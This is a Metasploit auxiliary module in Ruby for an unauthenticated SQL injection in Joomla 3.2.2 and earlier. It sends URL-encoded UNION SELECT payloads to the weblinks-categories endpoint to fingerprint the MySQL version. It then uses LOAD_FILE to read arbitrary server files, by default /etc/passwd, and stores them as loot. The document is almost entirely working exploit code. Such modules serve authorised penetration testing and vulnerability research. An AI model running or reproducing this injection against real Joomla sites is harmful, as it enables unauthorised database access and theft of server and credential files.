# This module requires Metasploit: http//metasploit.com/download
##
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read',
      'Description'    => %q{
      Joomla versions 3.2.2 and below are vulnerable to an unauthenticated SQL injection
      which allows an attacker to access the database or read arbitrary files as the
      'mysql' user.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile@gmail.com>', #metasploit module
        ],
      'References'     =>
        [
          ['EDB', '31459']
        ],
      'DisclosureDate' => 'Mar 2 2014'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Joomla directory path", '/joomla']),
        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
        OptInt.new('CATEGORYID', [true, "The category ID to use in the SQL injection", 0])
      ], self.class)

  end

  def check
    payload = datastore['CATEGORYID'].to_s
    payload << "%29%20UNION%20ALL%20SELECT%20CONCAT%280x71636f7471%2CIFNULL%28CAST%28VERSION%28%29%20"
    payload << "AS%20CHAR%29%2C0x20%29%2C0x7165776271%29%23"

    resp = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/index.php/weblinks-categories?id=' + payload)
    })

    if !resp or !resp.body
      return Exploit::CheckCode::Safe
    end

    version = /qcotq(.*)qewbq/.match(resp.body)

    if !version
      return Exploit::CheckCode::Safe
    end

    version = version[1].gsub('qcotq', '').gsub('qewbq', '')
    print_good("Fingerprinted: #{version}")
    return Exploit::CheckCode::Vulnerable
  end

  def run
    file = datastore['FILEPATH'].unpack("H*")[0]
    catid = datastore['CATEGORYID']

    payload = catid.to_s 
    payload << "%29%20UNION%20ALL%20SELECT%20CONCAT%280x7163756871%2CIFNULL%28CAST%28HEX%28LOAD_FILE%28"
    payload << "0x#{file}%29%29%20AS%20CHAR%29%2C0x20%29%2C0x716f687671%29%23"

    resp = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/index.php/weblinks-categories?id=' + payload)
    })

    if !resp or !resp.body
      fail_with("Server did not respond in an expected way. Verify the IP address.")
    end

    file = /qcuhq(.*)qohvq/.match(resp.body)

    if !file
      fail_with("Either the file didn't exist or the server has been patched.")
    end

    file = file[1].gsub('qcuhq', '').gsub('qohvq', '')
    file = [file].pack("H*")

    path = store_loot("joomla.file", "text/plain", datastore['RHOST'], file, datastore['FILEPATH'])

    if path and path != ''
      print_good("File saved to: #{path}")
    end
  end
end

